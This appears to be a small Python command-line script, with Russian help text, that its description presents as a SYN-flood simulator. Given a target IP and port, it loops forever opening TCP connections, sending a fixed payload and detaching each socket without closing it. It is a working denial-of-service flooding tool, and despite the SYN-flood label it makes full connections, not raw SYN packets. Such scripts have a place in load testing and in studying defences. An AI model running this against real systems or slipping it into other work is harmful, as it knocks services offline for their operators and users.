#!/usr/bin/env python3
from argparse import ArgumentParser, Namespace
import socket


def main(options: Namespace):
    ip: str = options.ip
    port: int = options.port
    message: bytes = b"1010101010"
    try:
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(message)
            s.detach()
    finally:
        s.close()


def parse_arguments() -> Namespace:
    parser = ArgumentParser(description='Скрипт для моделирования SYN-flood')
    parser.add_argument('--ip',
                        action='store',
                        dest='ip',
                        help='целевой адрес',
                        type=str,
                        required=True)

    parser.add_argument('-p', '--port',
                        action='store',
                        dest='port',
                        help='целевой порт',
                        type=int,
                        required=True)

    return parser.parse_args()


if __name__ == '__main__':
    main(parse_arguments())
